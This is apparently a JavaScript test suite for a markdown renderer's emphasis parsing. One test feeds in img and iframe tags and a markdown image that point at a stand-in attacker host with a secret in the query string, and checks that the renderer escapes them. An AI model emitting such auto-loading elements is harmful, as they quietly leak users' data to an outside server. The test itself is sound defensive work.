import assert from "node:assert/strict";
import { describe, test } from "node:test";

import { renderMarkdown } from "../src/markdown.js";

describe("inline emphasis", () => {
  test("plain bold and italic still render", () => {
    assert.equal(renderMarkdown("**bold** and *italic*"), "<p><strong>bold</strong> and <em>italic</em></p>");
  });

  test("bold that holds an italic title renders both, with no stars left", () => {
    const html = renderMarkdown("**1. *Resident Evil Requiem***");
    assert.equal(html, "<p><strong>1. <em>Resident Evil Requiem</em></strong></p>");
    assert.ok(!html.includes("*"));
  });

  test("an italic word inside a bold heading line renders", () => {
    const html = renderMarkdown("4.  **Explain the *process* (how it's done):**");
    assert.ok(html.includes("<strong>Explain the <em>process</em> (how it&#39;s done):</strong>"));
    assert.ok(!html.includes("*"));
  });

  test("bold inside a nested list item renders", () => {
    const html = renderMarkdown("1. **Item**\n    * **Good *and* useful:** yes");
    assert.ok(html.includes("<strong>Good <em>and</em> useful:</strong>"));
    assert.ok(!html.includes("**"));
  });

  test("triple stars render as bold italic", () => {
    assert.equal(renderMarkdown("***both***"), "<p><strong><em>both</em></strong></p>");
  });

  test("emphasis never reaches across a line break", () => {
    const html = renderMarkdown("**not\nclosed** here");
    assert.ok(!html.includes("<strong>"));
  });

  test("code spans keep their stars", () => {
    assert.equal(renderMarkdown("`a **b** c` and **d**"), "<p><code>a **b** c</code> and <strong>d</strong></p>");
  });

  test("links still render, and emphasis around them too", () => {
    const html = renderMarkdown("**see [docs](https://example.com/x)**");
    assert.ok(html.includes('<strong>see <a href="https://example.com/x"'));
  });

  test("untrusted markdown cannot create auto-loading HTML elements", () => {
    const html = renderMarkdown(
      '<img src="https://attacker.invalid/?secret=x"> ![alt](https://attacker.invalid/x) ' +
      '<iframe src="https://attacker.invalid/x"></iframe>',
    );
    assert.ok(!/<(?:img|iframe|link)\b/i.test(html));
    assert.ok(html.includes("&lt;img src=&quot;"));
    assert.ok(html.includes("&lt;iframe src=&quot;"));
  });

  test("a lone star in prose is left alone", () => {
    assert.equal(renderMarkdown("5 * 3 = 15"), "<p>5 * 3 = 15</p>");
  });

  test("unclosed emphasis on a long line renders quickly", () => {
    const line = "**a ".repeat(5000) + "*b ".repeat(5000);
    const started = performance.now();
    renderMarkdown(line);
    assert.ok(performance.now() - started < 500, "emphasis parsing must stay linear");
  });
});
